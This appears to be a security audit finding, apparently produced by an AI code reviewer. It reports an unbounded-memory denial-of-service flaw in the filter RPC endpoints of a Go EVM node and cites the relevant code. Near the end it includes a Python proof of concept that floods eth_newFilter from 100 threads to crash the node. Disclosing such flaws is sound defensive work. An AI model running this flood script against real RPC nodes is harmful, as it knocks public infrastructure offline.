Based on my thorough review of the code, I can identify a real vulnerability.

---

### Title
Unbounded Filter Map Growth via Unauthenticated `eth_newFilter`/`eth_newBlockFilter` Causes RPC Node OOM Crash — (`evmrpc/filter.go`)

### Summary
`NewFilter` and `NewBlockFilter` insert entries into the `FilterAPI.filters` map on every call with no cap on map size. An unauthenticated attacker can flood these endpoints, exhausting process memory and crashing the RPC node.

### Finding Description

`NewFilter` (line 397) and `NewBlockFilter` (line 422) unconditionally insert a new `filter` struct into `a.filters` on every invocation: [1](#0-0) 

The map is declared as an unbounded `map[ethrpc.ID]filter`: [2](#0-1) 

The only removal mechanism is the `cleanupLoop`, which runs at `filterConfig.timeout / 2` intervals and only removes entries whose `lastAccess` is older than `timeout`: [3](#0-2) 

A grep across all `evmrpc/*.go` files confirms there is **no** `maxFilter`, `FilterLimit`, or `len(a.filters)` guard anywhere. An attacker who calls `eth_newFilter` (or `sei_newFilter`, `eth_newBlockFilter`) in a tight loop accumulates entries faster than the cleanup ticker can remove them. Each `filter` struct holds a `filters.FilterCriteria` (addresses, topics, block numbers), a `context.CancelFunc`, and timestamps — small individually but unbounded in aggregate.

Additionally, `GetFilterLogs` (line 550) and `GetFilterChanges` (line 505) call `GetLogsByFilters` directly, bypassing the RPS limiter and backpressure checks that `GetLogs` applies: [4](#0-3) 

`GetFilterLogs` and `GetFilterChanges` have none of those guards: [5](#0-4) 

This means an attacker can also amplify I/O load by creating many filters with large (but within-limit) block ranges and polling them repeatedly without hitting the 30 req/s RPS limiter.

### Impact Explanation

Continuous `eth_newFilter` calls grow the `a.filters` map without bound. Go's runtime will eventually trigger an OOM panic or be killed by the OS OOM killer, crashing the RPC node process. This matches **Medium: Crash of RPC nodes running default configuration via direct unauthenticated network access to RPC/gRPC endpoints**.

### Likelihood Explanation

The endpoint is unauthenticated, publicly reachable on the default HTTP port, and requires zero funds. A single attacker with a fast HTTP client can issue thousands of requests per second. The filter timeout window (configurable, typically minutes) gives ample time to accumulate millions of entries before cleanup runs.

### Recommendation

1. **Cap the filter map size**: Before inserting in `NewFilter` and `NewBlockFilter`, check `len(a.filters)` against a configurable `maxFilters` limit (e.g., 10,000) and return an error if exceeded.
2. **Apply the RPS limiter to `GetFilterLogs`/`GetFilterChanges`**: Mirror the `globalRPSLimiter.Allow()` and backpressure checks from `GetLogs` into these two methods.
3. **Per-IP rate limiting**: Add a per-source-IP rate limiter at the HTTP middleware layer for filter-creation endpoints.

### Proof of Concept

```python
import requests, threading

url = "http://<rpc-node>:8545"
payload = {"jsonrpc":"2.0","method":"eth_newFilter",
           "params":[{"fromBlock":"latest","toBlock":"latest"}],"id":1}

def flood():
    while True:
        requests.post(url, json=payload)

# Launch 100 concurrent threads
for _ in range(100):
    threading.Thread(target=flood, daemon=True).start()

input("Press Enter to stop...")
```

Each thread creates filters faster than the cleanup ticker (running at `filterTimeout/2`) can expire them. The `a.filters` map grows without bound until the process is OOM-killed. [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** evmrpc/filter.go (L247-248)
```go
	filters          map[ethrpc.ID]filter
	toDelete         chan ethrpc.ID
```

**File:** evmrpc/filter.go (L283-288)
```go
	if filterConfig.maxBlock <= 0 {
		filterConfig.maxBlock = DefaultMaxBlockRange
	}
	if filterConfig.maxLog <= 0 {
		filterConfig.maxLog = DefaultMaxLogLimit
	}
```

**File:** evmrpc/filter.go (L324-343)
```go
func (a *FilterAPI) cleanupLoop(timeout time.Duration) {
	ticker := time.NewTicker(timeout / 2) // Check more frequently than timeout
	defer func() {
		ticker.Stop()
		recoverAndLog()
	}()

	for {
		select {
		case <-a.shutdownCtx.Done():
			return
		case <-ticker.C:
			// Clean up expired filters
			a.cleanupExpiredFilters(timeout)
		case filterID := <-a.toDelete:
			// Handle manual filter deletion
			a.removeFilter(filterID)
		}
	}
}
```

**File:** evmrpc/filter.go (L397-420)
```go
func (a *FilterAPI) NewFilter(
	ctx context.Context,
	crit filters.FilterCriteria,
) (id ethrpc.ID, err error) {
	startTime := time.Now()
	defer func() {
		recordMetricsWithError(ctx, fmt.Sprintf("%s_newFilter", a.namespace), a.connectionType, startTime, err, recover())
	}()

	_, cancel := context.WithCancel(a.shutdownCtx)

	a.filtersMu.Lock()
	defer a.filtersMu.Unlock()

	curFilterID := ethrpc.NewID()
	a.filters[curFilterID] = filter{
		typ:          LogsSubscription,
		fc:           crit,
		cancelFunc:   cancel,
		lastAccess:   time.Now(),
		lastToHeight: 0,
	}
	return curFilterID, nil
}
```

**File:** evmrpc/filter.go (L422-443)
```go
func (a *FilterAPI) NewBlockFilter(
	ctx context.Context,
) (id ethrpc.ID, err error) {
	startTime := time.Now()
	defer func() {
		recordMetricsWithError(ctx, fmt.Sprintf("%s_newBlockFilter", a.namespace), a.connectionType, startTime, err, recover())
	}()

	_, cancel := context.WithCancel(a.shutdownCtx)

	a.filtersMu.Lock()
	defer a.filtersMu.Unlock()

	curFilterID := ethrpc.NewID()
	a.filters[curFilterID] = filter{
		typ:         BlocksSubscription,
		cancelFunc:  cancel,
		lastAccess:  time.Now(),
		blockCursor: "",
	}
	return curFilterID, nil
}
```

**File:** evmrpc/filter.go (L550-551)
```go
	logs, lastToHeight, err := a.logFetcher.GetLogsByFilters(ctx, filter.fc, 0)
	if err != nil {
```

**File:** evmrpc/filter.go (L596-626)
```go
	// Use config value instead of hardcoded constant
	if blockRange > a.filterConfig.maxBlock {
		return nil, fmt.Errorf("block range too large (%d), maximum allowed is %d blocks", blockRange, a.filterConfig.maxBlock)
	}

	// Early rejection for pruned blocks - avoid wasting resources on blocks that don't exist
	if earliest > 0 && begin < earliest {
		return nil, fmt.Errorf("requested block range [%d, %d] includes pruned blocks, earliest available block is %d", begin, end, earliest)
	}

	// Only apply rate limiting for large queries (> RPSLimitThreshold blocks)
	if blockRange > RPSLimitThreshold && !a.globalRPSLimiter.Allow() {
		return nil, fmt.Errorf("log query rate limit exceeded for large queries, please try again later")
	}

	// Backpressure: early rejection based on system load
	m := GetGlobalMetrics()

	// Check 1: Too many pending tasks (queue backlog)
	pending := m.TasksSubmitted.Load() - m.TasksCompleted.Load()
	maxPending := int64(float64(m.QueueCapacity.Load()) * 0.8) // 80% threshold
	if pending > maxPending {
		return nil, fmt.Errorf("server too busy, rejecting new request (pending: %d, threshold: %d)", pending, maxPending)
	}

	// Check 2: I/O saturated (semaphore exhausted)
	semInUse := m.DBSemaphoreAcquired.Load()
	semCapacity := m.DBSemaphoreCapacity.Load()
	if semCapacity > 0 && float64(semInUse)/float64(semCapacity) >= 0.8 {
		return nil, fmt.Errorf("server I/O saturated, rejecting new request (semaphore: %d/%d in use)", semInUse, semCapacity)
	}
```
